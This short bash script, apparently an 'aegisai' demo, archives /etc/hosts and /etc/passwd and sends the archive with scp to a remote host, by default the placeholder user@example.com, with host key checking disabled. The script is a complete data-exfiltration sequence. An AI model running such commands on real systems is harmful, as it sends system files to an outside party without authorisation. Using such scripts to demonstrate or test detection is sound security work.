#!/usr/bin/env bash
set -euo pipefail

ARCHIVE="/tmp/aegisai-demo-$(date +%s).tar.gz"
tar -czf "$ARCHIVE" /etc/hosts /etc/passwd
scp -o StrictHostKeyChecking=no "$ARCHIVE" "${1:-user@example.com:/tmp/}"
